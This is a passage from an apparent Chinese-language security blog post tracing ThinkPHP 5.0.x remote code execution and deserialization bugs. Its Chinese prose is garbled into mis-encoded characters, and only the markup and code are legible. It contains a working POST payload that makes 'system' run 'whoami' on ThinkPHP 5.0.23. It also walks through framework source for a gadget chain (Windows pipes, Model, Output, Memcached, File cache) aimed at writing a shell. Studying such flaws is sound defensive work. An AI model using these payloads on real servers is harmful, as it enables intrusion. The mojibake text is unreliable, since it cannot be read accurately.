ç±»çš„inputå‡½æ•°ä¼šå¯¹è¾“å…¥æ‰§è¡Œcall_user_funcæ“ä½œã€‚å› æ­¤æœ€åæ‰§è¡Œäº†<code>call_user_func(&#39;system&#39;,&#39;whoami&#39;)</code><br>å› æ­¤å®˜æ–¹æœ€åçš„ä¿®å¤æ˜¯é’ˆå¯¹è¾“å…¥æ§åˆ¶å™¨åè¿›è¡Œè¿‡æ»¤<code>^[A-Za-z](\w)*$</code></p><h2 id="tp-5-rce-post"><a href="#tp-5-rce-post" class="headerlink" title="tp-5.*-rce-post"></a>tp-5.*-rce-post</h2><p>é¦–å…ˆè¿™ä¸ªrceç‰ˆæœ¬5.0.*åº”è¯¥æ˜¯å°äº5.0.24çš„ã€‚æ‰€ä»¥ç”¨ä¸€ä¸ª5.0.23ç‰ˆæœ¬çš„å®éªŒä¸‹ã€‚</p><p>é¦–å…ˆpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œå› ä¸ºæˆ‘çš„Index.phpæ˜¯ä¹‹å‰å®éªŒifiæ—¶çš„ã€‚æ‰€ä»¥index/indexè·¯ç”±è¿”å›Cache Success.å®é™…ä¸Š<code>s</code>åªéœ€è¦èµ‹ç»™ä¸€ä¸ªå­˜åœ¨methodçš„æ§åˆ¶å™¨å³å¯ã€‚</p><p>ä¸‹é¢æ¥è·Ÿä¸‹æºç ã€‚é¦–å…ˆä»å®˜æ–¹commitä¿®æ”¹å¤„å¯ä»¥çœ‹å‡ºåŸå…ˆä»£ç ä¸­<code>this-&gt;$method</code>å˜é‡æ¥è‡ªå¯æ§æ•°æ®<code>$_POST</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨Requestç±»çš„methodäº†ã€‚çœ‹åˆ°payloadä¸­å­˜åœ¨__constructã€‚è‡ªç„¶çœ‹å‘æ„é€ æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜ php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªforeachæ˜æ˜¾å­˜åœ¨é…ç½®è¦†ç›–çš„å†™æ³•ã€‚è¿™é‡Œç»§ç»­ä¸‹æ–­ç‚¹ä¸€è·¯è·Ÿå‘ç°ä¼šæ ¹æ®app_debugçš„å€¼å‰å¾€å½“å‰ç±»ä¸‹paramæ–¹æ³•ã€‚<br>è€Œè¿™ä¸ªæ–¹æ³•å…¨éƒ½èµ°inputæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯éƒ½ä¼šè°ƒç”¨äº†<code>call_user_func</code>ã€‚<br>å…·ä½“å¯ä»¥çœ‹è¿™å¼ å›¾<br><img src="/2020/08/05/Thinkphp-vuln/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‰é¢æåˆ°æˆ‘ä»¬å¯ä»¥è¦†ç›–å±æ€§ã€‚è¿™é‡Œä¸»è¦å°±æ˜¯è¦†ç›–<code>filter</code>è·Ÿ<code>server</code>ã€‚å› ä¸ºmethodæ–¹æ³•ä¸­æ˜¯å–çš„æˆ‘ä»¬ä¼ å…¥çš„<code>this-&gt;server[&#39;REQUEST_METHOD&#39;]</code>çš„å€¼ã€‚æ‰€ä»¥è¦†ç›–ä¸º<code>whoami</code>åä½œä¸ºå‚æ•°è¢«é€åˆ°input.inputåˆå› ä¸ºfiltervalueæ–¹æ³•è°ƒç”¨call_user_funcã€‚ç›´æ¥åˆ©ç”¨è¦†ç›–çš„<code>system</code>ä½œä¸ºfliterå€¼å³å¯ã€‚<br>æœ€ååˆ°è¾¾call_user_func rce<br><img src="/2020/08/05/Thinkphp-vuln/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp5-0-x-unserialize"><a href="#tp5-0-x-unserialize" class="headerlink" title="tp5.0.x-unserialize"></a>tp5.0.x-unserialize</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è·Ÿä¸‹tp5.0ç‰ˆæœ¬çš„ååºåˆ—åŒ–popé“¾ã€‚ä¸è¿‡è¿™é‡Œä¸ä¼šåˆ†äº«exp.(ç½‘ä¸Šè·Ÿå…ˆçŸ¥åº”è¯¥éƒ½èƒ½å¾ˆæ–¹ä¾¿æ‰¾åˆ°)ã€‚å¦‚æœéœ€è¦çš„è¯è‡ªå·±SCTF2020wpé‡Œæœ‰ç»•è¿‡çŸ­æ ‡ç­¾çš„expã€‚ä»¥åŠä»¥å‰è·Ÿphpæ¡†æ¶æœ‰å‡ ä¸ªå…¶ä»–çš„expå¯ä»¥è‡ªè¡Œå¯»æ‰¾ã€‚å½“ç„¶æˆ‘è®°å¾—wh1t3P1gå¤§ä½¬è‡ªå·±æŠŠtpçš„popchainé›†æˆåˆ°phpggcä¸­äº†ã€‚ä¹Ÿå¯ä»¥è‡ªåŠ¨ç”Ÿæˆã€‚</p><p>ç„¶åå°±æ˜¯windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚ç›®å‰èƒ½å¤Ÿåœ¨php7ä»¥å‰çš„ç‰ˆæœ¬å†™shell expæ˜¯æœ‰çš„ã€‚ä½†php7çš„windowså†™shellæˆ‘è¿˜æ²¡æˆåŠŸè¿‡ã€‚ç†è®ºä¸Šwindowsä¸èƒ½æˆåŠŸçš„åŸå› åªæ˜¯å› ä¸ºæ–‡ä»¶åä¸å…è®¸<code>&lt;</code>,<code>?</code>çš„ã€‚ä½†æ˜¯å¦‚æœç”¨è¿‡æ»¤å™¨ç»•è¿‡çš„è¯åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„â€¦â€¦<br>php5.4.45+windows æˆåŠŸå†™å…¥phpinfo() (å…³é—­çŸ­æ ‡ç­¾)<br><img src="/2020/08/05/Thinkphp-vuln/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œæˆ‘å°±ç›´æ¥è·Ÿä¸‹linuxçš„payloadå§ã€‚<br>é¦–å…ˆæ˜¯å…¥å£ç‚¹ã€‚è‚¯å®šæ˜¯æ‰¾<code>__destruct</code>å‡½æ•°ã€‚ä¸éš¾å‘ç°ä¸€å…±åªæœ‰å‡ ä¸ªå¯ç”¨ã€‚æˆ‘ä»¬æ‰¾åˆ° library\think\process\pipesä¸‹windows.phpã€‚å‘ç°å…¶è°ƒç”¨äº†<code>$this-&gt;removeFiles</code>.è€Œ<code>removeFiles</code>åˆè°ƒç”¨äº†<code>file_exists</code>å¯ä»¥è§¦å‘<code>__toString</code>æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps.å…³äºfile_existså¯ä»¥è§¦å‘<code>__toString</code>è‡ªå·±ä»¥å‰è¿˜æ²¡æœ‰æ³¨æ„è¿‡ã€‚å…·ä½“ä¸å¦¨å»l3m0nå¸ˆå‚…<a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ä¸‹è¯„è®ºçœ‹çœ‹ã€‚<br>(åº”è¯¥æ˜¯å› ä¸ºfile_existsæ¥å—å­—ç¬¦ä¸²å‚æ•°,è€Œåªè¦å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å³ä¼šè§¦å‘<code>__toString</code>)<br>å…¨å±€ç»§ç»­æ‰¾<code>toString</code>.ä¹Ÿåªæœ‰å‡ ä¸ªé€‰æ‹©ã€‚è¿™é‡Œæ‰¾åˆ° think\Model.php<br>.å®ƒè°ƒç”¨äº†<code>toJson</code>ã€‚è€Œ<code>toJson</code>ç»§ç»­è°ƒç”¨äº†<code>toArray</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶æ³¨æ„è¿™é‡ŒModelç±»æ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®é™…ç¼–å†™expæ—¶æˆ‘ä»¬å¿…é¡»ç”¨å®ƒçš„å­ç±»ã€‚æ¯”å¦‚æ­¤å¤„çš„Pivotã€‚<br>æˆ‘ä»¬ç›´æ¥æ¥åˆ°toArrayã€‚è¿™é‡Œé¦–å…ˆä¸»è¦çœ‹æœ‰æ²¡æœ‰å¯ä»¥è§¦å‘<code>__call</code>çš„æƒ…å†µã€‚5.0.24ç‰ˆæœ¬ä¸‹åº”è¯¥åˆä¸‰å¤„éƒ½æ˜¯å¯ä»¥æ»¡è¶³çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line">$item[$key] = $value ? $value-&gt;getAttr($attr) : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>ä¸å…¶è¯´æ˜¯æ‰¾è§¦å‘<code>__call</code>çš„ã€‚ä¸å¦‚è¯´æ˜¯æ‰¾å¯ç”¨æ–¹æ³•ã€‚å¤šæ•°æƒ…å†µä¸‹è¿™äº›æ–¹æ³•åŸºæœ¬åˆ©ç”¨ä¸äº†ã€‚ä½†æ˜¯å¦‚æœæ»¡è¶³<code>this-&gt;xxx($var)</code>æˆ–è€…è¿›ä¸€æ­¥<code>å¯æ§ç±»-&gt;xxx(å¯æ§å˜é‡)</code>ã€‚æˆ‘ä»¬å°±èƒ½æ‰¾ä»»æ„ç±»çš„<code>__call</code>è¿›è¡Œè¿›ä¸€æ­¥æŒ–æ˜ã€‚è¿™ä¹Ÿæ˜¯popé“¾ä¸­callæ–¹æ³•ç»å¸¸ç”¨åˆ°çš„åŸå› ä¹‹ä¸€ã€‚</p><p>ä¸ºäº†äº†è§£æˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™ä¸€æ­¥ç”¨æ¥è°ƒç”¨<code>__call</code>ã€‚æˆ‘ä»¬å…ˆæ”¾ä¸€ä¸‹å…¨å±€æ‰¾<code>__call</code>çš„è¿‡ç¨‹ã€‚æ¥é€‰æ‹©ä¸€ä¸ªè§¦å‘æ–¹å¼ã€‚<br>å¯¹äº<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code><br>è¿™é‡Œçœ‹çœ‹<code>$value</code>ä¸<code>$attr</code>ä¾æ¬¡æ˜¯æ€ä¹ˆè¢«èµ‹å€¼çš„ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>value</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = Loader::parseName($name, <span class="number">1</span>, <span class="keyword">false</span>);</span><br><span class="line">$modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">$value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å¯¹<code>$name</code>è°ƒç”¨parseNameã€‚è€Œ<code>$name</code>æ¥è‡ªå¯æ§æ•°ç»„<code>$this-&gt;append</code>ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¹Ÿå°±æ˜¯è¯´ã€‚<code>$modelrelation</code>æ˜¯Modelè¿™ä¸ªç±»ä»»æ„æ–¹æ³•çš„è¿”å›å€¼ã€‚(.<code>$relation()</code>)ã€‚æ‰€ä»¥æ‰¾ä¸€ä¸ªç›´æ¥è¿”å›å¯æ§æ•°æ®çš„æ–¹æ³•å³å¯ã€‚æ¯”å¦‚getError</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›åˆ°ä¸Šé¢ã€‚ç°åœ¨æˆ‘ä»¬ç»§ç»­è·Ÿè¿›getRelationData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span><span class="params">(Relation $modelRelation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// é¦–å…ˆè·å–å…³è”æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getRelation'</span>)) &#123;</span><br><span class="line">            $value = $modelRelation-&gt;getRelation();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">'method not exists:'</span> . get_class($modelRelation) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®ƒæ¥æ”¶çš„å‚æ•°æ˜¯<code>Relation</code>ç±»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸Šé¢è¿”å›çš„ç»“æœ<code>$this-&gt;error</code>è‚¯å®šä¹Ÿæ˜¯ä¸€ä¸ª<code>Relation</code>çš„å¯¹è±¡äº†ã€‚ï¼ˆRelationä¹Ÿæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®ä¾‹åŒ–æ—¶è¦ç”¨å®ƒçš„å­ç±»ï¼‰<br>ç„¶åæ­¤å¤„æˆ‘ä»¬è‡ªç„¶è¦èµ°ç¬¬ä¸€ä¸ªifåˆ†æ”¯æ¥æ§åˆ¶è¿”å›å€¼ã€‚åˆ†åˆ«çœ‹ä¸‹<code>isSelfRelation()</code>è·Ÿ<code>getModel()</code>å‘ç°éƒ½åªæ˜¯ç®€å•è¿”å›<code>this-&gt;relation</code>ä¸<code>this-&gt;query-&gt;model()</code>ã€‚å…¨éƒ¨å¯æ§ã€‚<br>é‚£åªå‰©ä¸‹è®©<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code>æˆç«‹äº†ã€‚<br>æ„æ€å°±æ˜¯<code>$modelRelation-&gt;getModel()</code>å’Œ<code>$this-&gt;parent</code>ä¸ºåŒç±»ï¼Œä¹Ÿå°±æ˜¯è¦æ±‚<code>$value-&gt;getAttr($attr)</code>ä¸­çš„<code>$value</code>å’Œä¸Šé¢å¯æ§çš„modelä¸ºåŒç±»<br>é‚£ä¹ˆç°åœ¨<code>$value-&gt;getAttr($attr)</code>çš„<code>value</code>è·Ÿå®Œäº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹<code>$attr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line"><span class="keyword">if</span> ($bindAttr) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($bindAttr <span class="keyword">as</span> $key =&gt; $attr)</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æåˆ°è¿‡ï¼Œ<code>modelRelation</code>å› ä¸ºå–è‡ªå¯æ§æ–¹æ³•æ‰€ä»¥æ˜¯ä»»æ„å€¼ã€‚æˆ‘ä»¬ç›´æ¥å…¨å±€æ‰¾<code>getBindAttr</code>æ–¹æ³•ã€‚åªæœ‰ä¸€ä¸ªæ¥å£ç±»:Relationçš„å­ç±»OnetoOne</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°æ®å¯æ§ã€‚ä¸è¿‡OnetoOneæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç»§ç»­æ‰¾å­ç±»ã€‚è¿™é‡Œå°±åªæœ‰ä¸¤ä¸ªå­ç±»ã€‚æˆ‘ä»¬é€‰æ‹©<code>HasOne</code>.</p><p>ç°åœ¨ã€‚æˆ‘ä»¬åšåˆ°äº†ä»»æ„è°ƒç”¨<code>__call</code>ã€‚å‰©ä¸‹çš„å°±æ˜¯æ‰¾å¯ç”¨çš„<code>__call</code>ã€‚</p><p>é‚£ä¹ˆå…¨å±€æ‰¾å¯ç”¨çš„<code>__call</code>ã€‚æ­¤å¤„å¯ä»¥æ‰¾åˆ°<br>think\console\Output ç±»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($method, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        array_unshift($args, $method);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, $method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, $method], $args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆé¦–å…ˆä¸Šé¢è§¦å‘ç‚¹é‡Œ<code>$this-&gt;parent</code>è‚¯å®šæ˜¯è¦ä¼ Outputç±»çš„å®ä¾‹äº†ã€‚<br>ä¸‹é¢çœ‹è¿™é‡Œçš„<code>$this-&gt;block()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span><span class="params">($style, $message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„æ˜¯<code>$this-&gt;handle-&gt;write</code>ã€‚æ—¢ç„¶<code>$this-&gt;handle</code>å¯æ§,é‚£ä¹ˆæ­¤å¤„æ‰¾ä¸€ä¸ªåŒåçš„<code>write</code>æ–¹æ³•ã€‚æˆ‘ä»¬å…¨å±€æœç´¢æ‰¾åˆ°Memcachedç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($sessID, $sessData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . $sessID, $sessData, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒç†ã€‚è¿˜æ˜¯å¯ä»¥å…¨å±€æ‰¾<code>set</code>æ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æ›¾ç»åœ¨tp5RCEä¸­è§åˆ°çš„Fileç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($expire <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span 